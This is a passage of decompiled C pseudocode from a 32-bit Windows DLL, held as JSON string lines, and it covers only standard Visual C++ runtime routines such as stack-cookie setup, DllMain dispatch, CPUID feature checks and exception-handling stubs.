    "  if ( Table._first == (_PVFV *)-1 )",
    "    v1 = sub_1001F7B7(Func);",
    "  else",
    "    v1 = _register_onexit_function(&Table, Func);",
    "  return v1 == 0 ? Func : 0;",
    "}",
    "",
    "",
    "int __cdecl atexit(void (__cdecl *Func)())",
    "{",
    "  return (_onexit((_onexit_t)Func) != 0) - 1;",
    "}",
    "",
    "",
    "BOOL __cdecl __raise_securityfailure(struct _EXCEPTION_POINTERS *ExceptionInfo)",
    "{",
    "  HANDLE CurrentProcess; // eax",
    "",
    "  SetUnhandledExceptionFilter(0);",
    "  UnhandledExceptionFilter(ExceptionInfo);",
    "  CurrentProcess = GetCurrentProcess();",
    "  return TerminateProcess(CurrentProcess, 0xC0000409);",
    "}",
    "",
    "",
    "void __cdecl  __report_gsfailure()",
    "{",
    "  int v0; // ebx",
    "  int v1; // edi",
    "  int v2; // esi",
    "  int v3; // edx",
    "  int v4; // ecx",
    "  unsigned int v5; // kr00_4",
    "  int vars0; // [esp+324h] [ebp+0h]",
    "  int retaddr; // [esp+328h] [ebp+4h]",
    "  char v8; // [esp+32Ch] [ebp+8h] BYREF",
    "",
    "  if ( IsProcessorFeaturePresent(0x17u) )",
    "    __fastfail(2u);",
    "  dword_1003FF28 = 0;",
    "  dword_1003FF24 = v4;",
    "  dword_1003FF20 = v3;",
    "  dword_1003FF1C = v0;",
    "  dword_1003FF18 = v2;",
    "  dword_1003FF14 = v1;",
    "  word_1003FF40 = __SS__;",
    "  word_1003FF34 = __CS__;",
    "  word_1003FF10 = __DS__;",
    "  word_1003FF0C = __ES__;",
    "  word_1003FF08 = __FS__;",
    "  word_1003FF04 = __GS__;",
    "  v5 = __readeflags();",
    "  dword_1003FF38 = v5;",
    "  dword_1003FF2C = vars0;",
    "  dword_1003FF30 = retaddr;",
    "  dword_1003FF3C = (int)&v8;",
    "  dword_1003FE78 = 65537;",
    "  dword_1003FE34 = retaddr;",
    "  dword_1003FE28 = -1073740791;",
    "  dword_1003FE2C = 1;",
    "  dword_1003FE38 = 1;",
    "  dword_1003FE3C = 2;",
    "  __raise_securityfailure((struct _EXCEPTION_POINTERS *)&ExceptionInfo);",
    "}",
    "",
    "",
    "void  sub_10015989()",
    "{",
    "  __report_securityfailure(8);",
    "}",
    "",
    "",
    "void __usercall  __report_securityfailure(int a1@<ebx>, int a2@<edi>, int a3@<esi>, unsigned int a4)",
    "{",
    "  int v4; // edx",
    "  int v5; // ecx",
    "  unsigned int v6; // kr00_4",
    "  int vars0; // [esp+31Ch] [ebp+0h]",
    "  int retaddr; // [esp+320h] [ebp+4h]",
    "",
    "  if ( IsProcessorFeaturePresent(0x17u) )",
    "    __fastfail(a4);",
    "  dword_1003FF28 = 0;",
    "  dword_1003FF24 = v5;",
    "  dword_1003FF20 = v4;",
    "  dword_1003FF1C = a1;",
    "  dword_1003FF18 = a3;",
    "  dword_1003FF14 = a2;",
    "  word_1003FF40 = __SS__;",
    "  word_1003FF34 = __CS__;",
    "  word_1003FF10 = __DS__;",
    "  word_1003FF0C = __ES__;",
    "  word_1003FF08 = __FS__;",
    "  word_1003FF04 = __GS__;",
    "  v6 = __readeflags();",
    "  dword_1003FF38 = v6;",
    "  dword_1003FF2C = vars0;",
    "  dword_1003FF30 = retaddr;",
    "  dword_1003FF3C = (int)&a4;",
    "  dword_1003FE34 = retaddr;",
    "  dword_1003FE28 = -1073740791;",
    "  dword_1003FE2C = 1;",
    "  dword_1003FE38 = 1;",
    "  dword_1003FE3C = a4;",
    "  __raise_securityfailure((struct _EXCEPTION_POINTERS *)&ExceptionInfo);",
    "}",
    "",
    "",
    "// Microsoft VisualC 14/net runtime",
    "void *__cdecl unknown_libname_6(size_t a1)",
    "{",
    "}// attributes: thunk",
    "void __cdecl j_j_j___free_base(void *Block)",
    "{",
    "}int __stdcall dllmain_crt_dispatch(HINSTANCE a1, unsigned int a2, void *const a3)",
    "{",
    "  int result; // eax",
    "",
    "  switch ( a2 )",
    "  {",
    "    case 0u:",
    "      return dllmain_crt_process_detach(a3 != 0);",
    "    case 1u:",
    "      return dllmain_crt_process_attach(a1, a3);",
    "    case 2u:",
    "      LOBYTE(result) = __scrt_dllmain_crt_thread_attach();",
    "      break;",
    "    case 3u:",
    "      LOBYTE(result) = sub_1001561A();",
    "      break;",
    "    default:",
    "      return 1;",
    "  }",
    "  return (unsigned __int8)result;",
    "}",
    "",
    "",
    "int __cdecl dllmain_crt_process_attach(HINSTANCE a1, void *const a2)",
    "{",
    "  char v2; // bl",
    "  _DWORD *v3; // eax",
    "  _DWORD *v4; // esi",
    "  char v6; // [esp+13h] [ebp-1Dh]",
    "",
    "  if ( !__scrt_initialize_crt(0) )",
    "    return 0;",
    "  v6 = __scrt_acquire_startup_lock();",
    "  v2 = 1;",
    "  if ( dword_1003FE04 )",
    "  {",
    "    __scrt_fastfail(7);",
    "    __debugbreak();",
    "  }",
    "  dword_1003FE04 = 1;",
    "  if ( __scrt_dllmain_before_initialize_c() )",
    "  {",
    "    sub_1001652E();",
    "    sub_100164ED();",
    "    __scrt_initialize_default_local_stdio_options();",
    "    if ( !_initterm_e((_PIFV *)&dword_100301B0, (_PIFV *)&dword_100301CC) )",
    "    {",
    "      if ( __scrt_dllmain_after_initialize_c() )",
    "      {",
    "        _initterm((_PVFV *)&First, (_PVFV *)&Last);",
    "        dword_1003FE04 = 2;",
    "        v2 = 0;",
    "      }",
    "    }",
    "  }",
    "  __scrt_release_startup_lock(v6);",
    "  if ( v2 )",
    "    return 0;",
    "  v3 = (_DWORD *)sub_10016528();",
    "  v4 = v3;",
    "  if ( *v3 )",
    "  {",
    "    if ( __scrt_is_nonwritable_in_current_image((int)v3) )",
    "      ((void (__thiscall *)(_DWORD, HINSTANCE, int, void *const))*v4)(*v4, a1, 2, a2);",
    "  }",
    "  ++dword_10040144;",
    "  return 1;",
    "}",
    "",
    "",
    "BOOL __cdecl dllmain_crt_process_detach(__vcrt_bool Terminating)",
    "{",
    "  char v2; // [esp+10h] [ebp-20h]",
    "  BOOL v3; // [esp+14h] [ebp-1Ch]",
    "",
    "  if ( dword_10040144 <= 0 )",
    "    return 0;",
    "  --dword_10040144;",
    "  v2 = __scrt_acquire_startup_lock();",
    "  if ( dword_1003FE04 != 2 )",
    "  {",
    "    __scrt_fastfail(7);",
    "    __debugbreak();",
    "  }",
    "  __scrt_dllmain_uninitialize_c();",
    "  sub_100164F9();",
    "  sub_1001655A();",
    "  dword_1003FE04 = 0;",
    "  __scrt_release_startup_lock(v2);",
    "  v3 = __scrt_uninitialize_crt(Terminating, 0) != 0;",
    "  sub_1001567E();",
    "  return v3;",
    "}",
    "",
    "",
    "int __cdecl dllmain_dispatch(HINSTANCE hinstDLL, DWORD fdwReason, void *const lpvReserved)",
    "{",
    "  void *v4; // ebx",
    "  int v5; // esi",
    "  BOOL v6; // eax",
    "",
    "  if ( !fdwReason && dword_10040144 <= 0 )",
    "    return 0;",
    "  if ( fdwReason != 1 && fdwReason != 2 )",
    "  {",
    "    v4 = lpvReserved;",
    "LABEL_9:",
    "    v6 = DllMain(hinstDLL, fdwReason, v4);",
    "    v5 = v6;",
    "    if ( fdwReason == 1 && !v6 )",
    "    {",
    "      DllMain(hinstDLL, 0, v4);",
    "      dllmain_crt_process_detach(v4 != 0);",
    "      dllmain_raw(hinstDLL, 0, v4);",
    "    }",
    "    if ( !fdwReason || fdwReason == 3 )",
    "    {",
    "      v5 = dllmain_crt_dispatch(hinstDLL, fdwReason, v4);",
    "      if ( v5 )",
    "        return dllmain_raw(hinstDLL, fdwReason, v4);",
    "    }",
    "    return v5;",
    "  }",
    "  v4 = lpvReserved;",
    "  v5 = dllmain_raw(hinstDLL, fdwReason, lpvReserved);",
    "  if ( v5 )",
    "  {",
    "    v5 = dllmain_crt_dispatch(hinstDLL, fdwReason, lpvReserved);",
    "    if ( v5 )",
    "      goto LABEL_9;",
    "  }",
    "  return v5;",
    "}",
    "",
    "",
    "int __stdcall dllmain_raw(HINSTANCE a1, unsigned int a2, void *const a3)",
    "{",
    "  return 1;",
    "}",
    "",
    "",
    "BOOL __stdcall DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)",
    "{",
    "  if ( fdwReason == 1 )",
    "    __security_init_cookie();",
    "  return dllmain_dispatch(hinstDLL, fdwReason, lpReserved);",
    "}",
    "",
    "",
    "// positive sp value has been detected, the output may be wrong!",
    "void _EH_epilog3()",
    "{",
    "}void _EH_epilog3_GS()",
    "{",
    "  ;",
    "}",
    "",
    "",
    "_DWORD *__usercall _EH_prolog3@<eax>(int a1@<eax>)",
    "{",
    "  _DWORD v3[2]; // [esp-8h] [ebp-8h] BYREF",
    "  int retaddr; // [esp+0h] [ebp+0h]",
    "",
    "  v3[1] = a1;",
    "  v3[0] = NtCurrentTeb()->NtTib.ExceptionList;",
    "  retaddr = -1;",
    "  return v3;",
    "}",
    "",
    "",
    "_DWORD *__usercall _EH_prolog3_GS@<eax>(int a1@<eax>)",
    "{",
    "  _DWORD v3[2]; // [esp-8h] [ebp-8h] BYREF",
    "  int retaddr; // [esp+0h] [ebp+0h]",
    "",
    "  v3[1] = a1;",
    "  v3[0] = NtCurrentTeb()->NtTib.ExceptionList;",
    "  retaddr = -1;",
    "  return v3;",
    "}",
    "",
    "",
    "_DWORD *__usercall _EH_prolog3_catch@<eax>(int a1@<eax>)",
    "{",
    "  _DWORD v3[2]; // [esp-8h] [ebp-8h] BYREF",
    "  int retaddr; // [esp+0h] [ebp+0h]",
    "",
    "  v3[1] = a1;",
    "  v3[0] = NtCurrentTeb()->NtTib.ExceptionList;",
    "  retaddr = -1;",
    "  return v3;",
    "}",
    "",
    "",
    "void nullsub_1()",
    "{",
    "  ;",
    "}",
    "",
    "",
    "int sub_10015E9C()",
    "{",
    "  int v5; // edi",
    "  int v11; // eax",
    "  int v12; // edx",
    "  unsigned int v14; // edi",
    "  unsigned int v29; // esi",
    "  int v30; // eax",
    "  unsigned int v31; // ecx",
    "  int v32; // eax",
    "  int v33; // eax",
    "  int v34; // ecx",
    "  unsigned int v35; // eax",
    "  int v36; // edi",
    "  int v38; // [esp+0h] [ebp-28h]",
    "  int v39; // [esp+10h] [ebp-18h]",
    "  int v40; // [esp+10h] [ebp-18h]",
    "  int v41; // [esp+14h] [ebp-14h]",
    "  int v42; // [esp+14h] [ebp-14h]",
    "  char v43; // [esp+18h] [ebp-10h]",
    "  int v44; // [esp+1Ch] [ebp-Ch]",
    "  int v45; // [esp+20h] [ebp-8h]",
    "  int v46; // [esp+24h] [ebp-4h]",
    "",
    "  dword_1004014C = 0;",
    "  dword_1003F090 |= 1u;",
    "  if ( IsProcessorFeaturePresent(0xAu) )",
    "  {",
    "    _EAX = 0;",
    "    __asm { cpuid }",
    "    v46 = _EAX;",
    "    v5 = _EBX ^ 0x756E6547;",
    "    v39 = _EDX ^ 0x49656E69;",
    "    v41 = _ECX ^ 0x6C65746E;",
    "    _EAX = 1;",
    "    __asm { cpuid }",
    "    v38 = _EAX;",
    "    if ( !(v5 | v41 | v39) )",
    "    {",
    "      v11 = _EAX & 0xFFF3FF0;",
    "      if ( (v38 & 0xFFF3FF0) == 0x106C0",
    "        || v11 == 132704",
    "        || v11 == 132720",
    "        || v11 == 198224",
    "        || v11 == 198240",
    "        || v11 == 198256 )",
    "      {",
    "        dword_10040150 |= 1u;",
    "      }",
    "    }",
    "    v12 = _ECX;",
    "    _EBX = 0;",
    "    v42 = 0;",
    "    v14 = 0;",
    "    v40 = 0;",
    "    v44 = _ECX;",
    "    if ( v46 >= 7 )",
    "    {",
    "      _EAX = 7;",
    "      __asm { cpuid }",
    "      v45 = _EBX;",
    "      v42 = _EDX;",
    "      if ( (_EBX & 0x200) != 0 )",
    "        dword_10040150 |= 2u;",
    "      if ( _EAX >= 1 )",
    "      {",
    "        _EAX = 7;",
    "        __asm { cpuid }",
    "        _EBX = v45;",
    "        v40 = _EDX;",
    "      }",
    "      _EAX = 36;",
    "      if ( v46 >= 36 )",
    "      {",
    "        __asm { cpuid }",
    "        v29 = _EBX;",
    "        _EBX = v45;",
    "        v14 = v29;",
    "      }",
    "      v12 = v44;",
    "    }",
    "    v30 = dword_1003F090 | 2;",
    "    v31 = dword_1003F088 & 0xFFFFFFFE;",
    "    dword_1004014C = 1;",
    "    dword_1003F090 |= 2u;",
    "    dword_1003F088 &= ~1u;",
    "    if ( (v12 & 0x100000) != 0 )",
    "    {",
    "      v32 = v30 | 4;",
    "      dword_1004014C = 2;",
    "      dword_1003F090 = v32;",
    "      dword_1003F088 = v31 & 0xFFFFFFEF;",
    "      if ( (v12 & 0x8000000) != 0 && (v12 & 0x10000000) != 0 )",
    "      {",
    "        __asm { xgetbv }",
    "        v43 = v32;",
    "        if ( (v32 & 6) == 6 )",
    "        {",
    "          v33 = dword_1003F090 | 8;",
    "          dword_1004014C = 3;",
    "          dword_1003F090 |= 8u;",
    "          if ( (_EBX & 0x20) != 0 )",
    "          {",
    "            v34 = dword_1003F08C;",
    "            dword_1003F090 = v33 | 0x20;",
    "            v35 = dword_1003F088 & 0xFFFFFFFD;",
    "            dword_1004014C = 5;",
    "            dword_1003F088 &= ~2u;",
    "            if ( (_EBX & 0xD0030000) != 0xD0030000 )",
    "            {",
    "LABEL_27:",
    "              if ( (v42 & 0x800000) != 0 )",
    "              {",
    "                dword_1003F08C = v34;",
    "                dword_1003F088 = v35 & 0xFEFFFFFF;",
    "              }",
    "              if ( (v40 & 0x80000) != 0 && (v43 & 0xE0) == 0xE0 )",
    "              {",
    "                dword_10040148 = v14 & 0x400FF;",
    "                v36 = dword_1003F088 & ~(HIWORD(v14) & 7 | 0x1000028);",
    "                dword_1003F088 = v36;",
    "                if ( (unsigned int)dword_10040148 > 1 )",
    "                  dword_1003F088 = v36 & 0xFFFFFFBF;",
    "              }",
    "              return 0;",
    "            }",
    "            if ( (v43 & 0xE0) == 0xE0 )",
    "            {",
    "              dword_1003F090 |= 0x40u;",
    "              v35 = dword_1003F088 & 0xFFFFFFDB;",
    "              v34 = dword_1003F08C;",
    "              dword_1004014C = 6;",
    "              dword_1003F088 &= 0xFFFFFFDB;",
    "              goto LABEL_27;",
    "            }",
    "          }",
    "          v34 = dword_1003F08C;",
    "          v35 = dword_1003F088;",
    "          goto LABEL_27;",
    "        }",
    "      }",
    "    }",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "unsigned int __stdcall _aulldiv(unsigned __int64 a1, __int64 a2)",
    "{",
    "  unsigned __int64 v3; // rtt",
    "  unsigned int v4; // ecx",
    "  unsigned int v5; // ebx",
    "  unsigned __int64 v6; // rax",
    "  char v7; // cf",
    "  unsigned int v8; // esi",
    "  unsigned __int64 v9; // rax",
    "",
    "  if ( HIDWORD(a2) )",
    "  {",
    "    v4 = HIDWORD(a2);",
    "    v5 = a2;",
    "    v6 = a1;",
    "    do",
    "    {",
    "      v7 = v4 & 1;",
    "      v4 >>= 1;",
    "      v5 = (v5 >> 1) | (v7 << 31);",
    "      v6 >>= 1;",
    "    }",
    "    while ( v4 );",
    "    v8 = v6 / v5;",
    "    v9 = v8 * (unsigned __int64)(unsigned int)a2;",
    "    if ( __CFADD__(HIDWORD(a2) * v8, HIDWORD(v9)) || (HIDWORD(v9) = (a2 * (unsigned __int64)v8) >> 32, v9 > a1) )",
    "      --v8;",
    "    return v8;",
    "  }",
    "  else",
    "  {",
    "    LODWORD(v3) = a1;",
    "    HIDWORD(v3) = HIDWORD(a1) % (unsigned int)a2;",
    "    return v3 / (unsigned int)a2;",
    "  }",
    "}",
    "",
    "",
    "unsigned __int64 __stdcall _aullrem(unsigned __int64 a1, __int64 a2)",
    "{",
    "  unsigned __int64 v2; // rtt",
    "  unsigned int v4; // ecx",
    "  unsigned int v5; // ebx",
    "  unsigned __int64 v6; // rax",
    "  bool v7; // cf",
    "  int v8; // ecx",
    "  unsigned __int64 v9; // rax",
    "",
    "  if ( HIDWORD(a2) )",
    "  {",
    "    v4 = HIDWORD(a2);",
    "    v5 = a2;",
    "    v6 = a1;",
    "    do",
    "    {",
    "      v7 = v4 & 1;",
    "      v4 >>= 1;",
    "      v5 = (v5 >> 1) | (v7 << 31);",
    "      v6 >>= 1;",
    "    }",
    "    while ( v4 );",
    "    v8 = HIDWORD(a2) * (v6 / v5);",
    "    v9 = (unsigned int)a2 * (unsigned __int64)(unsigned int)(v6 / v5);",
    "    v7 = __CFADD__(v8, HIDWORD(v9));",
    "    HIDWORD(v9) += v8;",
    "    if ( v7 || v9 > a1 )",
    "      v9 -= a2;",
    "    return a1 - v9;",
    "  }",
    "  else",
    "  {",
    "    LODWORD(v2) = a1;",
    "    HIDWORD(v2) = HIDWORD(a1) % (unsigned int)a2;",
    "    return v2 % (unsigned int)a2;",
    "  }",
    "}",
    "",
    "",
    "// attributes: thunk",
    "void __cdecl j_j___free_base(void *Block)",
    "{",
    "}void  sub_100162BA()",
    "{",
    "  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-Ch] BYREF",
    "",
    "  sub_10014B54(pExceptionObject);",
    "  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);",
    "}",
    "",
    "",
    "int sub_100162D7()",
    "{",
    "  return 1;",
    "}",
    "",
    "",
    "BOOL __scrt_is_ucrt_dll_in_use()",
    "{",
    "  return dword_10040998 != 0;",
    "}",
    "",
    "",
    "LONG __usercall __scrt_fastfail@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, unsigned int a4)",
    "{",
    "  void *v4; // eax",
    "  int v5; // ecx",
    "  int v6; // edx",
    "  unsigned int v7; // kr00_4",
    "  BOOL v8; // esi",
    "  LONG result; // eax",
    "  _DWORD v10[179]; // [esp+8h] [ebp-324h] BYREF",
    "  _DWORD v11[20]; // [esp+2D4h] [ebp-58h] BYREF",
    "  _EXCEPTION_POINTERS ExceptionInfo; // [esp+324h] [ebp-8h] BYREF",
    "  int savedregs; // [esp+32Ch] [ebp+0h]",
    "  _UNKNOWN *retaddr; // [esp+330h] [ebp+4h] BYREF",
    "",
    "  if ( IsProcessorFeaturePresent(0x17u) )",
    "    __fastfail(a4);",
    "  sub_100163FC(3);",
    "  v4 = memset(v10, 0, sizeof(v10));",
    "  v10[44] = v4;",
    "  v10[43] = v5;",
    "  v10[42] = v6;",
    "  v10[41] = a1;",
    "  v10[40] = a3;",
    "  v10[39] = a2;",
    "  LOWORD(v10[50]) = __SS__;",
    "  LOWORD(v10[47]) = __CS__;",
    "  LOWORD(v10[38]) = __DS__;",
    "  LOWORD(v10[37]) = __ES__;",
    "  LOWORD(v10[36]) = __FS__;",
    "  LOWORD(v10[35]) = __GS__;",
    "  v7 = __readeflags();",
    "  v10[48] = v7;",
    "  v10[46] = retaddr;",
    "  v10[49] = &retaddr;",
    "  v10[0] = 65537;",
    "  v10[45] = savedregs;",
    "  memset(v11, 0, sizeof(v11));",
    "  v11[0] = 1073741845;",
    "  v11[1] = 1;",
    "  v11[3] = retaddr;",
    "  v8 = IsDebuggerPresent();",
    "  ExceptionInfo.ExceptionRecord = (PEXCEPTION_RECORD)v11;",
    "  ExceptionInfo.ContextRecord = (PCONTEXT)v10;",
    "  SetUnhandledExceptionFilter(0);",
    "  result = UnhandledExceptionFilter(&ExceptionInfo);",
    "  if ( !result && !v8 )",
    "    return sub_100163FC(3);",
    "  return result;",
    "}",
    "",
    "",
    "void sub_100163FC()",
    "{",
    "  dword_10040154 = 0;",
    "}",
    "",
    "",
    "_DWORD *__cdecl _SEH_prolog4(int a1, int a2)",
    "{",
    "  void *v4; // esp",
    "  void *v6; // [esp-18h] [ebp-18h]",
    "  _DWORD v7[2]; // [esp-8h] [ebp-8h] BYREF",
    "  _UNKNOWN *retaddr; // [esp+0h] [ebp+0h]",
    "  int v9; // [esp+4h] [ebp+4h]",
    "",
    "  v7[1] = _except_handler4;",
    "  v7[0] = NtCurrentTeb()->NtTib.ExceptionList;",
    "  v4 = alloca(a2);",
    "  v9 = -2;",
    "  retaddr = v6;",
    "  return v7;",
    "}",
    "",
    "",
    "unsigned int __get_entropy()",
    "{",
    "  LARGE_INTEGER PerformanceCount; // [esp+0h] [ebp-14h] BYREF",
    "  struct _FILETIME SystemTimeAsFileTime; // [esp+8h] [ebp-Ch] BYREF",
    "  DWORD v3; // [esp+10h] [ebp-4h] BYREF",
    "",
    "  SystemTimeAsFileTime.dwLowDateTime = 0;",
    "  SystemTimeAsFileTime.dwHighDateTime = 0;",
    "  GetSystemTimeAsFileTime(&SystemTimeAsFileTime);",
    "  v3 = SystemTimeAsFileTime.dwLowDateTime ^ SystemTimeAsFileTime.dwHighDateTime;",
    "  v3 ^= GetCurrentThreadId();",
    "  v3 ^= GetCurrentProcessId();",
    "  QueryPerformanceCounter(&PerformanceCount);",
    "  return (unsigned int)&v3 ^ v3 ^ PerformanceCount.LowPart ^ PerformanceCount.HighPart;",
    "}",
    "",
    "",
    "void __cdecl __security_init_cookie()",
    "{",
    "  uintptr_t v0; // ecx",
    "  unsigned int entropy; // eax",
    "",
    "  v0 = __security_cookie;",
    "  if ( __security_cookie == -1153374642 || (__security_cookie & 0xFFFF0000) == 0 )",
    "  {",
    "    entropy = __get_entropy();",
    "    v0 = entropy;",
    "    if ( entropy == -1153374642 )",
    "    {",
    "      v0 = -1153374641;",
    "    }",
    "    else if ( (entropy & 0xFFFF0000) == 0 )",
    "    {",
    "      v0 = ((entropy | 0x4711) << 16) | entropy;",
    "    }",
    "    __security_cookie = v0;",
    "  }",
    "  dword_1003F080 = ~v0;",
    "}",
    "",
    "",
    "void sub_100164ED()",
    "{",
    "  InitializeSListHead(&ListHead);",
    "}",
    "",
    "",
    "int sub_100164F9()",
    "{",
    "  return __std_type_info_destroy_list(&ListHead);",
    "}",
    "",
    "",
    "void *sub_10016505()",
    "{",
    "  return &unk_10040160;",
    "}",
    "",
    "",
    "_DWORD *__scrt_initialize_default_local_stdio_options()",
    "{",
    "  _DWORD *v0; // eax",
    "  int v1; // ecx",
    "  _DWORD *result; // eax",
    "  int v3; // ecx",
    "",
    "  v0 = sub_10003540();",
    "  v1 = v0[1];",
    "  *v0 |= 0x24u;",
    "  v0[1] = v1;",
    "  result = sub_10016505();",
    "  v3 = result[1];",
    "  *result |= 2u;",
    "  result[1] = v3;",
    "  return result;",
    "}",
    "",
    "",
    "void *sub_10016528()",
    "{",
    "  return &unk_10040994;",
    "}",
    "",
    "",
    "void sub_1001652E()",
    "{",
    "  ;",
    "}",
    "",
    "",
    "void sub_1001655A()",
    "{",
    "  ;",
    "}",
    "",
    "",
    "void __stdcall  sub_10016590(int a1)",
    "{",
    "  off_1003F0A0(a1, 0);",
    "}",
    "",
    "",
    "_DWORD *__thiscall sub_100165B0(_DWORD *this, int a2)",
    "{",
    "  int v3; // ecx",
    "",
    "  *this = &off_10030FF4;",
    "  this[1] = *(_DWORD *)(a2 + 4);",
    "  v3 = *(_DWORD *)(a2 + 8);",
    "  this[2] = v3;",
    "  this[3] = 0;",
    "  if ( v3 )",
    "    (*(void (__thiscall **)(_DWORD, int))(*(_DWORD *)v3 + 4))(*(_DWORD *)(*(_DWORD *)v3 + 4), v3);",
    "  return this;",
    "}",
    "",
    "",
    "_DWORD *__thiscall sub_100165F0(_DWORD *this, int a2, int a3, char a4)",
    "{",
    "  *this = &off_10030FF4;",
    "  this[1] = a2;",
    "  this[2] = a3;",
    "  this[3] = 0;",
    "  if ( a3 && a4 )",
    "    (*(void (__thiscall **)(_DWORD, int))(*(_DWORD *)a3 + 4))(*(_DWORD *)(*(_DWORD *)a3 + 4), a3);",
    "  return this;",
    "}",
    "",
    "",
    "HLOCAL __thiscall sub_10016640(void *this)",
    "{",
    "  int v2; // ecx",
    "  HLOCAL result; // eax",
    "",
    "  v2 = *((_DWORD *)this + 2);",
    "  *(_DWORD *)this = &off_10030FF4;",
    "  if ( v2 )",
    "    (*(void (__thiscall **)(_DWORD, int))(*(_DWORD *)v2 + 8))(*(_DWORD *)(*(_DWORD *)v2 + 8), v2);",
    "  result = (HLOCAL)*((_DWORD *)this + 3);",
    "  if ( result )",
    "    return LocalFree(*((HLOCAL *)this + 3));",
    "  return result;",
    "}",
    "",
    "",
    "void *__thiscall sub_100166B0(void *Block, char a2)",
    "{",
    "  int v3; // ecx",
    "",
    "  v3 = *((_DWORD *)Block + 2);",
    "  *(_DWORD *)Block = &off_10030FF4;",
    "  if ( v3 )",
    "    (*(void (__thiscall **)(_DWORD, int))(*(_DWORD *)v3 + 8))(*(_DWORD *)(*(_DWORD *)v3 + 8), v3);",
    "  if ( *((_DWORD *)Block + 3) )",
    "    LocalFree(*((HLOCAL *)Block + 3));",
    "  if ( (a2 & 1) != 0 )",
    "    sub_100154EB(Block);",
    "  return Block;",
    "}",
    "",
    "",
    "void __cdecl  sub_10016740(int a1, int a2)",
    "{",
    "  _DWORD pExceptionObject[4]; // [esp+0h] [ebp-10h] BYREF",
    "",
    "  sub_100165F0(pExceptionObject, a1, a2, 0);",
    "  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI1_AV_com_error__);",
    "}",
    "",
    "",
    "_DWORD *__cdecl __FrameHandler3::GetRangeOfTrysToCheck(_DWORD *a1, int a2, int a3, int a4, int a5, int a6)",
    "{",
    "  int v6; // ecx",
    "  unsigned int v7; // edx",
    "  unsigned int v8; // esi",
    "  _DWORD *v9; // eax",
    "  unsigned int v10; // edx",
    "  _DWORD *result; // eax",
    "  unsigned int v12; // [esp+Ch] [ebp-4h]",
    "",
    "  v6 = a6;",
    "  v7 = *(_DWORD *)(a5 + 12);",
    "  v8 = v7;",
    "  v12 = v7;",
    "  if ( a6 >= 0 )",
    "  {",
    "    v9 = (_DWORD *)(*(_DWORD *)(a5 + 16) + 8 + 20 * v7);",
    "    while ( v7 != -1 )",
    "    {",
    "      v9 -= 5;",
    "      --v7;",
    "      if ( *(v9 - 1) < a3 && a3 <= *v9 || v7 == -1 )",
    "      {",
    "        v8 = v12;",
    "        --v6;",
    "        v12 = v7;",
    "      }",
    "      if ( v6 < 0 )",
    "        goto LABEL_9;",
    "    }",
    "LABEL_12:",
    "    abort();",
    "  }",
    "LABEL_9:",
    "  v10 = v7 + 1;",
    "  if ( v8 > *(_DWORD *)(a5 + 12) || v10 > v8 )",
    "    goto LABEL_12;",
    "  result = a1;",
    "  a1[3] = v8;",
    "  *a1 = a2;",
    "  a1[1] = v10;",
    "  a1[2] = a2;",
    "  return result;",
    "}",
    "",
    "",
    "void *__cdecl _CallCatchBlock2(",
    "        struct EHRegistrationNode *a1,",
    "        const struct _s_FuncInfo *a2,",
    "        void *a3,",
    "        int a4,",
    "        unsigned int a5)",
    "{",
    "  return (void *)_CallSettingFrame(a3, a1, a5);",
    "}",
    "",
    "",
    "int __cdecl _CallSETranslator(",
    "        struct EHExceptionRecord *a1,",
    "        struct EHRegistrationNode *a2,",
    "        void *a3,",
    "        void *a4,",
    "        const struct _s_FuncInfo *a5,",
    "        int a6,",
    "        struct EHRegistrationNode *a7)",
    "{",
    "  int v8; // [esp+0h] [ebp-40h] BYREF",
    "  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp+4h] [ebp-3Ch]",
    "  int (__cdecl *v10)(PEXCEPTION_RECORD, PVOID, int); // [esp+8h] [ebp-38h]",
    "  const struct _s_FuncInfo *v11; // [esp+10h] [ebp-30h]",
    "  struct EHRegistrationNode *v12; // [esp+14h] [ebp-2Ch]",
    "  int v13; // [esp+18h] [ebp-28h]",
    "  struct EHRegistrationNode *v14; // [esp+1Ch] [ebp-24h]",
    "  int *v15; // [esp+20h] [ebp-20h]",
    "  int *v16; // [esp+24h] [ebp-1Ch]",
    "  int v17; // [esp+28h] [ebp-18h]",
    "  _DWORD v18[3]; // [esp+2Ch] [ebp-14h] BYREF",
    "  int v19; // [esp+38h] [ebp-8h]",
    "  void (__cdecl *v20)(unsigned int, _DWORD *); // [esp+3Ch] [ebp-4h]",
    "  int savedregs; // [esp+40h] [ebp+0h] BYREF",
    "",
    "  if ( a1 == (struct EHExceptionRecord *)291 )",
    "  {",
    "    a2->pNext = (EHRegistrationNode *)&_ExceptionContinuation_6;",
    "    return 1;",
    "  }",
    "  else",
    "  {",
    "    v10 = sub_10016A42;",
    "    v11 = a5;",
    "    v12 = a2;",
    "    v13 = a6;",
    "    v14 = a7;",
    "    v17 = 0;",
    "    v15 = &v8;",
    "    v16 = &savedregs;",
    "    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;",
    "    a1->ExceptionCode = _filter_x86_sse2_floating_point_exception_default(a1->ExceptionCode);",
    "    v19 = 1;",
    "    v18[0] = a1;",
    "    v18[1] = a3;",
    "    v20 = *(void (__cdecl **)(unsigned int, _DWORD *))(__vcrt_getptd() + 8);",
    "    v18[2] = v20;",
    "    v20(a1->ExceptionCode, v18);",
    "    v19 = 0;",
    "    if ( v17 )",
    "      ExceptionList->Next = NtCurrentTeb()->NtTib.ExceptionList->Next;",
    "    return v19;",
    "  }",
    "}",
    "",
    "",
    "void __stdcall _JumpToContinuation(",
    "        void (__stdcall *a1)(void *, struct EHRegistrationNode *),",
    "        struct EHRegistrationNode *a2)",
    "{",
    "  a1(a1, a2);",
    "}",
    "",
    "",
    "int __userpurge sub_10016951@<eax>(",
    "        struct _EXCEPTION_REGISTRATION_RECORD **a1@<ebx>,",
    "        PVOID TargetFrame,",
    "        PEXCEPTION_RECORD ExceptionRecord)",
    "{",
    "  int result; // eax",
    "",
    "  RtlUnwind(TargetFrame, &loc_1001697C, ExceptionRecord, 0);",
    "  result = ExceptionRecord->ExceptionFlags & 0xFFFFFFFD;",
    "  ExceptionRecord->ExceptionFlags = result;",
    "  *a1 = NtCurrentTeb()->NtTib.ExceptionList;",
